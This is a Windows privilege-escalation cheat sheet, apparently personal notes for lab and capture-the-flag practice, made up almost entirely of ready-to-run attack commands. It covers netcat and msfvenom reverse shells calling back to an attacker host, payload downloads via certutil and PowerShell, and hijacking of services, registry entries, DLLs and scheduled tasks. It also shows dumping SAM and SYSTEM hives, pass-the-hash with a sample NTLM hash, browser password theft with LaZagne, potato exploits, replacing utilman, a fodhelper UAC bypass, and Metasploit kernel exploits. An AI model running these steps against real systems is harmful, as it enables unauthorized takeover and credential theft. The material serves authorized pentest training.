if required then download 32 bit x86 netcat
```
https://github.com/int0x33/nc.exe/
```
start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
```
to get shell back from windows to kali : 
start a listener on Kali:
```
rlwrap -f . nc -lvnp 4444
```
windows command to get reverse shell of cmd : 
```
nc.exe -e cmd.exe <kali ip> 4444
```

##### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
###### User 
to check current user 
```
whoami
```
you need to get till "NT AUTHORITY\SYSTEM" or "Administrator"
to see what all users are present on system 
```
net user
```
to check which group the user belongs to 
```
net user <username>
```
###### Group : 
to see which all groups i am added to and Mandatory Label: 
```
whoami /groups
```
to see what all groups are made 
```
net localgroup
```
to see which all users are present in a particular group : 
```
net localgroup <group name>
```
to see what all users are in the administrators group : 
```
net localgroup administrators
```
###### OS : 
details about system (ex. kernel version , OS name , Hotfix) : 
```
systeminfo
```
Windows hotfixes and security updates installed on the machine : 
```
wmic qfe get *
```
###### Processes : 
so see what all processes are running
```
tasklist
tasklist /v               # for verbose
tasklist /svc             # processes mapped to services
```
###### Network : 
for  IP Address , Gateway :
```
ipconfig /all
```
routing table : 
```
route print
```
to see internally which all ports are open which were not visible from outside : 
```
netstat -ano
```
Firewall settings for the currently active network profile : 
```
netsh advfirewall show currentprofile
```
all Windows Firewall rules configured on the computer :
to check if port forwarding or reverse shells are not working 
```
netsh advfirewall firewall show rule name=all
```
###### Scheduled Tasks : 
```
schtasks /query /fo list /v
or
powershell Get-ScheduledTask
```

to see what all applications are installed : 
```
wmic product get *
wmic product get Caption, Description, InstallLocation, Name
```

Which all files do I have Read/Write permission to :
```
accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
# for "users" group
```

to check all installed services : 
```
sc query
```

to check which all binaries have auto elevate privileges enabled :
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

to set integrity level of a file : 
```
icacls <file name> /setintegritylevel m
# m = medium 
# h = high
# you cannot set integrity level higher than that of your user
```
##### <span style="color:rgb(11, 142, 224)">Winpeas (Look for easy wins here first)</span>
###### If nothing works , then try Winpeas
Download `winPEASx64.exe` : 
```
https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
```
transfer to windows
run : 
```
.\winPEASx64.exe > windows.txt
```
we'll run winpeas and transfer our file back to kali to analyze more properly

For searching a specific thing in winpeas : 
```
grep -aiA 10 "Looking if you can modify any service registry" windows.txt
grep -aiA 10 "AlwaysInstallElevated" windows.txt
grep -aiA 10 "startup" windows.txt
grep -aiA 10 "putty" windows.txt
```

if found creds in putty , login using ssh

### <span style="color:rgb(11, 142, 224)">Service Abuse : </span>

###### Windows Service Enumeration : 

Displays services and their current states, such as `RUNNING` or `STOPPED`.
```
sc query
```

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. don't focus on system32 or admin directories
2. which are in program files or tmp or users directory 
3. Look for "LocalSystem"
4. which seems like custom services not default ones
5. which you can modify 
6. Which don't have quoted path (" ")

to get more details about a specific service which you find interesting: 
```
sc qc <service name>
```
see start type , binary path and service start name
we need to check if the binary path is writeable/modifiable
###### <span style="color:rgb(11, 142, 224)">Automated Tools : </span>

SharpUp :
downlaod from : 
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
transfer to windows 
switch to cmd
```
cmd
```
Run SharpUp
```
.\SharpUp.exe audit
```

accesschk : 
Download from :
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
unzip 
transfer `accesschk.exe` to windows 
run :
```
.\accesschk.exe -cv <servicename> -accepteula
```

PowerUp (PowerShell) :
download from :
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
transfer to windows 
switch to power shell : 
```
powershell
```
Import PowerUp in powershell
```
Import-Module .\PowerUp.ps1
```
Run all checks
```
Invoke-AllChecks
```

----

start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://192.168.163.199:8000/accesschk.exe -o accesschk.exe
```

###### <span style="color:rgb(11, 142, 224)">Method 1 : Change the Service Executable in the path</span>

Use SharpUp and Look for
=== Modifiable Service Binaries ===

```cmd
wmic service get name, startname, pathname
```
can be quoted path as well here

```
sc qc filepermsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server : 
```
python3 -m http.server 8000
```
download on windows directly to path :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
or 
download normally then replace the service .exe file
```
copy reverse.exe
```
now we need to start the service
If its "demand_start" it wont start automatically 
Restart the service (or wait for reboot if no permissions)
```
net start <service_name>
net stop <service_name>
# sc start
# sc stop
```
well get a reverse shell back 

###### <span style="color:rgb(11, 142, 224)">Method 2 : Change the Service Executable path</span>

Use SharpUp and Look for
=== Modifiable Services ===

```
sc qc daclsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\DACL Service\daclservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

we see we have neither of W , M , F in this 
that means we cannot write or modify this 
now well check if we can modify its path

well use accesschk : 
follow steps from there now
look for `RW Everyone : SERVICE_CHANGE_CONFIG`
this permission should be in everyone or you group in which you are in 
that means we can modify the file path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```
change bin path 
```
sc config daclsvc binpath= "C:\temp\reverse.exe"
```
verify it again 
```
sc qc daclsvc
```
now start listener and start the service
```
net start daclsvc
```
well get the shell back

###### <span style="color:rgb(11, 142, 224)">Method 3 : Unquoted Service Paths</span>

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. Which don't have quotes (" ")
2. **Contains whitespaces** (e.g., `C:\Program Files\Some Folder\app.exe`)
3. which seems like custom services not default ones
4. don't focus on system32 or admin directories
5. which are in program files or tmp or users directory 
6. Running as **LocalSystem**
No quotes + spaces in path + LocalSystem = **exploitable**

automated way : (do manual also)
well use PowerUp (PowerShell) for that
go to automated tools for that
You can also use the targeted function:
```powershell
Get-ServiceUnquoted
```
now look for `[*] Checking for unquoted service paths...`

now for ex. if we get `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
we have to check recursively from the starting of folder path till ending to see if we have write access to the folder or not
till we get we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this folder contents ex. "BUILTIN\Users:(F)"
```
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
icacls "C:\Program Files\Unquoted Path Service\Common Files"
```
after the get the folder where we have writeable permissions for : 
ex. so in this the search order will be for system as 
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe 
```
make a reverse shell with the name of "FOLDER NAME FIRST WORD.exe"
transfer to windows 
and paste in this path

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o Common.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://192.168.163.199:8000/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
start the service
```
net start unquotedsvc
```
well get the shell back
###### <span style="color:rgb(11, 142, 224)">Method 4 : DLL Hijacking </span>

SAME AS UNQUOTED SERVICE PATHS CONCEPT

PowerUp (PowerShell) :
download from :
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
transfer to windows 
switch to power shell : 
```
powershell
```
Import PowerUp in powershell
```
Import-Module .\PowerUp.ps1
```
Run all checks
```
Invoke-AllChecks
```
Look for `Checking %PATH%" for potentially hijackable DLL locations`

Enumeration 1 : 
ProcMon :
```
▹ Add Filter: Process Name = yourapp.exe (process name , is , <filename>.exe , include , add , apply)
▹ Add Filter: Result = NAME NOT FOUND
```

and serach for `dllsvc` 
```
sc qc dllsvc
```
now we start the service manually again : 
```
sc start dllsvc
```
observe on procmon 
we see some entries it is creating some files 
we see how much access we have on this folder which it is using
```
icacls "C:\Program Files\DLL Hijack Service"
```
again well check other folder , check all 
acc to the path
```
echo %PATH%
```
now well make a malicious dll using msfvenom 
make the output file of the same name 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f dll -o hijackme.dll
```
now well transfer to windows now 
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://192.168.163.199:8000/hijackme.dll "C:\temp\hijackme.dll"
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
stop service 
```
sc stop dllsvc
```
then start 
```
sc start dllsvc
```
we get a reverse shell back : 

OPTION 2 : 

Enumeration 2 :
Check permissions to unprivileged paths
```
▹ icacls <directory>
▹ accesschk.exe -accepteula -dqv <directory>
```

Exploit :
Create a payload 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f dll -o hijackme.dll
```
Place the DLL in the writable path
```
copy reverse.dll <writable_dll_path>
```
Restart the service (or wait for reboot if no permissions)
```
sc start <service_name>
sc stop <service_name>
```

### <span style="color:rgb(11, 142, 224)">Sensitive Credentials</span>

###### <span style="color:rgb(11, 142, 224)">Unattended Windows Installations</span>

first come to C:\ folder 
```
cd C:\
```
search all files in C:\
```
dir /s /b | findstr /i "unattend.xml"
```
then view each file by 
```
type "full path of file"
```
###### <span style="color:rgb(11, 142, 224)">Powershell History</span>

CMD : 
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

PowerShell : 
```
cat (Get-PSReadlineOption).HistorySavePath
```
###### <span style="color:rgb(11, 142, 224)">Saved Windows Credentials</span>

```shell-session
cmdkey /list
```
do to see which all groups have which all users
```
net user
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option
```shell-session
runas /savecred /user:<found username here> cmd.exe
runas /savecred /user:admin cmd.exe
```
###### <span style="color:rgb(11, 142, 224)">IIS Configuration</span>

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
find 
```
<add connectionString
```
in last 
###### <span style="color:rgb(11, 142, 224)">Retrieve Credentials from Software: PuTTY</span>

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

It might be that the user same password for system as well so try it also
###### <span style="color:rgb(11, 142, 224)">Browser saved passwords : </span>

download `Lazagne.exe `from : 
```
https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.7
```
transfer to windows 
```
.\LaZagne.exe all
.\laZagne.exe browsers
.\laZagne.exe browsers -firefox
```
###### <span style="color:rgb(11, 142, 224)">Passwords - Security Account Manager (SAM)</span>

The standard locations are:
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```

If for ex. system has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory

we go to the directory
```
cd C:\Windows\Repair
C:\Windows\Repair>dir
```
Transfer the SAM and SYSTEM files to your Kali VM using SMB 
On Kali start SMB server : 
```
impacket-smbserver share .
```
On windows transfer files : 
```
copy <input file name> \\<kali ip>\share\<output file name>

# copy SAM \\192.168.163.199\share\SAM
# copy SYSTEM \\192.168.163.199\share\SYSTEM
```
now well use secrets dump by impacket 
```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

<span style="color:rgb(11, 142, 224)">Method 1 : Pass the Hash (Preferred)</span>
now well do pass the hash using psexec to gain admin 
since we got admin hash
**Hash format:** `uid:rid:lmhash:nthash` — the **last hash** (after the second `:`) is the **NTLM hash** you want.
```
impacket-psexec Administrator@<windows target ip> -hashes :<password hash>
```
 Spacing is strict. The format is `-hashes :<NTLM_HASH>` (colon before the hash, no LM hash).
for some user it might work for some users it might now
```
impacket-psexec admin@10.49.149.124 -hashes :a9fdfa038c4b75ebc76dc855dd74f0da
```
well get a shell of admin

<span style="color:rgb(11, 142, 224)">Method 2 : Password cracking </span>
john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```
You can use the cracked password to log in as the admin using winexe or RDP.
### <span style="color:rgb(11, 142, 224)">Registry Attacks</span>

Windows Registry = A shared database where Windows stores configuration settings.
###### <span style="color:rgb(11, 142, 224)">Autorun</span>

Enumeration : 
Check Run or RunOnce keys :
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

Check write access to the exe for current user:
check for both the paths locations 
```
icacls <directory/file>
accesschk.exe -accepteula -wuqv [file]
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

paste reverse shell (.exe) to that location to replace the program that is starting in Autorun
Start a listener on Kali

Wait for the administrator to log on
restart the Windows VM.
Open up a new RDP session (with username as admin) to trigger a reverse shell running with admin privileges.

###### <span style="color:rgb(11, 142, 224)">Weak Registry Permissions (changing path of executable in registry)</span>

Use Winpeas 
grep only that section from winpeas output 
```
grep -aiA 5 "Looking if you can modify any service registry" windows.txt
```

now we get details about this service in registry for full `ImagePath`
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
```

we check for our permissions on the path :
switch to PowerShell
```
Get-Acl -Path "HKLM\System\CurrentControlSet\services\regsvc" | fl
```
Look for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`

now we make a reverse shell 
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```

now we modify the original registry path so that the service loads our reverse shell
```
reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
```

now we check if we start this service oursef or not 
```
sc qc regsvc
```
also check `BINARY_PATH_NAME` here to see if path changed or not
if it says `START_TYPE : DEMAND_START` , we can start it manually

start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```

we start the service now 
```
sc start regsvc
```
we get a shell back 

###### <span style="color:rgb(11, 142, 224)">AlwaysInstallElevated</span>

Enumerate : 
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
For BOTH Registry keys : 
`AlwaysInstallElevated` must be set to `1` (`0x1`) 
`DisableMSI`  should be set  to `0` (`0x0`)  i.e False so we can execute our `.msi`

now well make a reverse shell of `.msi`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f msi > reverse.msi
```
enter our kali ip and port
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.msi reverse.msi
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
run the msi
```
.\reverse.msi
# msiexec /quiet /qn /i C:\PrivEsc\reverse.msi ; if 1st one doesnt work
```
well get a reverse shell back 
### <span style="color:rgb(11, 142, 224)">Privilege Attacks</span>

###### <span style="color:rgb(11, 142, 224)">to check current privileges</span>
```
whoami /priv
whoami /all
```
`State` of the Privilege should be `Enabled`

check `systeminfo` to know architecture first 32 bit or 64 bit
```
systeminfo
```
###### <span style="color:rgb(11, 142, 224)">if SeImpersonatePrivilege : Disabled : </span>
Full powers : 
```
https://github.com/itm4n/FullPowers
```
download : `FullPowers.exe`
run : 
```
.\FullPowers.exe
```

#### <span style="color:rgb(11, 142, 224)">SeImpersonate/SeAssignPrimaryToken Privilege</span>

###### <span style="color:rgb(11, 142, 224)">GodPotato : </span>
```
https://github.com/BeichenDream/GodPotato
```
download the net4 version (try all versions if one does not work)
upload a reverse shell also to same folder as God Potato
Then from the Windows LOCAL SERVICE shell:
```
.\GodPotato-NET4.exe -cmd reverse.exe
```
start listener 
well get rev shell back
###### <span style="color:rgb(11, 142, 224)">Juicy Potato : </span>
Windows 7, Windows 10/Server 2016 1803
If its Windows 7 / Server 2008 R2 - x86 / 32-bit
search on google for - "juicy potato 32 bit github"
download : `Juicy.Potato.x86.exe` , rename if necessary
```
https://github.com/ivanitlearning/Juicy-Potato-x86/releases
```
transfer to windows : 
```
python3 -m http.server 8000
```
Windows get file : 
```
certutil -f -urlcache http://10.10.14.138:8000/JuicyPotato.exe JuicyPotato.exe
```
now we make a reverse shell 
For 32 bit x86 architecture : 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
start python server on kali : 
```
python3 -m http.server 8000
```
transfer to windows
```
certutil -f -urlcache http://10.10.14.138:8000/reverse.exe reverse.exe
```

now run the juicy potato 
```
.\JuicyPotato.exe -t * -p "C:\Users\Public\reverse.exe" -l 4444 -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```
we get reverse shell back 
if the exploit is not working , change CLSID as per version of windows for the exploit to work 
```
https://github.com/ohpe/juicy-potato/tree/master/CLSID
```
###### <span style="color:rgb(11, 142, 224)">RoguePotato : </span>
Windows Server 2019 1809 -
download `RoguePotato.zip` from 
```
https://github.com/antonioCoco/RoguePotato
https://github.com/antonioCoco/RoguePotato/releases/tag/1.0
```
we not transfer it to windows 
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/RoguePotato.exe -o RoguePotato.exe
```
Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim windows IP>:9999
```
run it it wont give any output
now well transfer a reverse shell also to same folder of rogue potato 
star listener on kali
```
rlwrap -f . nc -lvnp 4444
```
on windows run rogue potato 
```
RoguePotato.exe -r <kali ip> -e reverse.exe -l 9999
```
we get a rev shell back 
###### <span style="color:rgb(11, 142, 224)">PrintSpoofer</span>
Windows 10/Server 2016 1607, Server 2019

download from 
```
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
```
download PrintSpoofer32.exe or PrintSpoofer64.exe
If error : try for both print spoofer 32 bit and 64 bit according to your need
transfer to windows
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/PrintSpoofer64.exe -o PrintSpoofer64.exe
```
on windows , get reverse shell also from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/reverse.exe -o reverse.exe
```
start listener on kali : 
```bash
rlwrap -f . nc -lvnp 4444
```
run print spoofer 
```
PrintSpoofer64.exe -c reverse.exe -i
```
we get rev shell back 
if we didn't wanted a call back to our listener using a reverse shell
we could have gotten system in same shell as well
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
```
#### <span style="color:rgb(11, 142, 224)">SeTakeOwnership</span>

we take ownership of utilman
```
takeown /f C:\Windows\System32\utilman.exe
```
confirm check who is the owner : 
```
powershell (Get-Acl "C:\windows\system32\utilman.exe").Owner
```
now give access of utilman to our user
```
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
```
we saw from owner command , our username , so 
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

now we make a reverse shell and transfer it to windows 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
start python server on kali : 
```
python3 -m http.server 8000
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
if you want in current directory : 
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```

now well replace our reverse shell with the utilman 
```
copy reverse.exe C:\windows\system32\utilman.exe
```
overwrite : yes

now we trigger utilman
from start windows menu > user round icon > lock 
now click on ease of access button 
after clicking we will get reverse shell back
#### <span style="color:rgb(11, 142, 224)">SeBackup/SeRestore Privilege</span>

we take out SAM and SYSTEM from registry directly
and then well save it locally in our documents
```
reg save hklm\sam sam
reg save hklm\system system
```
now well transfer these back to our kali 

On Kali start SMB server : 
```
impacket-smbserver share . -smb2support
```
On windows transfer files : 
```
copy sam \\10.10.14.138\share\sam
copy system \\10.10.14.138\share\system

# ex. copy windows.txt \\192.168.131.128\share\windows.txt
```

now we dump these files
```
impacket-secretsdump -sam sam -system system LOCAL
```
we get admin hash
```
Format: RID : LM hash : NT hash
```

### <span style="color:rgb(11, 142, 224)">Other Windows Components</span>

#### <span style="color:rgb(11, 142, 224)">Kernel Exploitation </span>

check `systeminfo`
```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
look for `OS Name` , `OS Version` , `Hotfix(s)` , `System Type`

Find matching exploits
```
▹ searchsploit windows kernel <build number> <OSversion>
▹ ExploitDB
▹ GitHub
```

now to compile there are 2 different ocmmanads
gcc - when code is in C 
g++ when code is in C++
if i want to compile for 64 bit :
```
x86_64-w64-mingw32-gcc exploit.c –o exploit.exe
```
if i want to compile for 32 bit :
```
i686-w64-mingw32-gcc exploit.c –o exploit.exe
```

----

Alternative with Metasploit : 

First establish a reverse shell in Metasploit : 
Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
create reverse shell For Metasploit Meterpreter handler : 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
transfer to windows 
now back on kali start listener 
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.174 [Kali VM IP Address] 
set lport 4444
run
```
now run our reverse shell on windows : 
```
reverse.exe
```

Exploitation  : 
Kali VM : 
now we will background this shell session and use our payload 
```
background
use post/multi/recon/local_exploit_suggester
set session 1
show options
run
```

it has now identified a lot of potential cves for the kernel version : 
green ones are vulnerable , red ones are not
well use one of these now , preferably starting from the newest i.e from bottom green ones 
```
use exploit/windows/local/cve_2022_21999_spoolfool_privesc
set session 1 
show options
set lhost 10.10.14.174
set lport 5555                  #change the port now 
run
```
well open shell now 
```
meterpreter > shell
```


For windows 7 you can use : 
```
exploit/windows/local/ms16_014_wmi_recv_notif
```
For windows 10 you can use : 
```
exploit/windows/local/cve_2022_21999_spoolfool_privesc
exploit/windows/local/cve_2022_21882_win32k
exploit/windows/local/cve_2020_0796_smbghost
exploit/windows/local/cve_2020_1048_printerdemon 
```

#### <span style="color:rgb(11, 142, 224)">Scheduled Tasks</span>

first we enumerate : 
switch to powershell
```
powershell
```
run : 
```
Get-ScheduledTask | ft TaskName,TaskPath,State
```

from here we will not choose tasks with default path of `\Microsoft\Windows`
we will see for other vulnerable paths
for ex. 
```
vulntask                                             \              
```
now we enumerate more on the task we found 
```
schtasks /query /fo LIST /v /tn <TASK NAME>
```
from here look for path of task and other details : 
```
Next Run Time:                        N/A (n/A : we can run it whenever we want)
Task To Run:                          C:\tasks\schtask.bat 
Scheduled Task State:                 Enabled
Run As User:                          taskusr1
Schedule Type:                        At system start up
```

now we have to check if we have write permission on the task file location or not 
```
icacls C:\tasks\schtask.bat 
```
or
switch to PowerShell : 
```
powershell
```
run : 
```
Get-Acl -Path "C:\tasks\schtask.bat" | fl
```

if users have full access :
now in this scheduled task well add a new line for our reverse shell or use netcat
Start a listener on Kali and then append a line
```
>    # to replace the contents of the file
>>   # to append / add new lines in bottom
```

```
echo c:\tools\nc64.exe -e cmd.exe 192.168.163.199 4444 > C:\tasks\schtask.bat
or 
echo <path_for_reverse_shell> >> <path_for_script.ps1> 
```
check : 
```
type C:\tasks\schtask.bat
```
first well start our listener on kali 
```
rlwrap -f . nc -lvnp 4444
```

now if it says the scheduled task is made run on startup 
if we have the permission to restart/run the task we could do : 
```
schtasks /run /tn vulntask
```
or 
you can restart the windows vm if we have permission 
```
shutdown -r
```
we will get shell back

#### <span style="color:rgb(11, 142, 224)">Startup Apps</span>

from the winpeas the output 
```
grep -aiA 10 "startup" windows.txt
```
look for : 
```
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Users [Allow: AllAccess]
```


we go to the startup folders common for all users : 
```
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```
we check our current permissions in this directory 
```
icacls .
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 


now we make a reverse shell and transfer it there
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o reverse.exe
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
start python server : 
```
python3 -m http.server 8000
```
Transfer to target:
```cmd
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"
```


now if lab says simulate admin login 
from winpeas output : 
```
grep -aiA 10 "putty" windows.txt
```
if we got amin user and pass for putty 
so well use rdp or ssh to login 
```
xfreerdp /v:10.49.133.136 /u:admin /p:password123 /cert:ignore /dynamic-resolution
ssh admin@<target-ip>
```

now on the current user terminal which we already have enter any command ex. `whoami`
```
C:\Users\user>whoami
```
we get admin shell back on our listener
#### <span style="color:rgb(11, 142, 224)">Insecure GUI Apps</span>

<span style="color:rgb(11, 142, 224)">Paint : </span>

there is a "admin paint" shortcut on the desktop 
so we can tell by the name it is opening with admin privileges

run it 
when we click it it opened cmd for a second then paint app opens 

now we check from which user this process is running : 
```
tasklist /v | findstr /i paint
```

we can see it is running with user : "admin"

now go to the opened paint application 
In Paint, click "File" and then "Open". 

In the open file dialog box, click in the navigation input and paste
type the full path shown on top of file system 
```
C:\Windows\System32\cmd.exe
```
Press Enter to spawn a command prompt running with admin privileges.


<span style="color:rgb(11, 142, 224)">File Explorer : </span>

open file explorer 

first go to File > Open Windows PowerShell > frequent places : desktop
then again come back and repeat : 
you will get option to "open windows PowerShell as administrator"

#### <span style="color:rgb(11, 142, 224)">Windows UAC Bypass (Admin Medium to High Integrity)</span>

Admin Medium to High Integrity privilege escalation : 

Conditions : 
1. UAC is enabled
2. User is already in administrators group
3. Shell is already of medium integrity

Check UAC enabled
```
0 – Disabled (never notify)
2 – Always notify (anything that requires admin)
3 - Notify when apps make changes, not me (desktop is not
dimmed)
5 – Default (notify when apps make changes, not me)
```


now we have to check if UAC is enabled or not 
```
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
we can see its value is 5 i.e (0x5)

##### Method 1 : msconfig (GUI ACCESS REQUIRED) :

from apps search `msconfig` and open `system configuration`
go to
tools > command prompt > launch 
a cmd will open with admin and high integrity level 

##### Method 2 : Authorization Manager (azman) (GUI ACCESS REQUIRED)

press : windows + R or search for `run` in apps
type : 
```
azman.msc
```

go to help > help topics 
right click in middle 
go to view source 

notepad will open 
now click 
file > open 

In the open file dialog box, click in the navigation input and paste: 
type the full path shown on top of file system 
```
C:\Windows\System32\cmd.exe
```
press enter 
it will open a admin cmd with high integrity level 
##### Method 3 : fodhelper (NO GUI required , ONLY CMD REQUIRED)

we start another reverse shell listener in another terminal 
so we get a shell from our initial rev shell 
```
rlwrap -f . nc -lvnp 4444
```

we save the reg key in environment variable so we don't have to set it again and again 
```
set REG_KEY="HKCU\Software\Classes\ms-settings\Shell\Open\command"
```

set variable as well 
```
set CMD="C:\Users\admin\nc64.exe -e cmd.exe 192.168.163.199 4444"
```

now we need to reference environment variable 
% sign is for referencing
inside the REG_KEY environment variable we set we are adding a sub key 
```
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```

we gave reverse shell command in CMD so we put it here
```
reg add %REG_KEY% /d %CMD% /f
```

so what we did till now 
1. in fodhelper , there is a registry key , in which it is told which command is to be run for this setting/ this particular action 
2. so that setting has a key "HKCU\Software\Classes\ms-settings\Shell\Open\command"
3. this key tells which command we have to open inside the windows settings 
4. additional paramets also go with this command
5. so we updated the original command and uplaoded our malicious command
6. we do "DelegateExecute" so it runs with all the users

now we will run 
```
fodhelper.exe
```
and it will go to its regisrty key "HKCU\Software\Classes\ms-settings\Shell\Open\command" and check which setting page to open its setting page 
which has our malicious command

in our additional listener , 
we get rev shell back with high integrity level

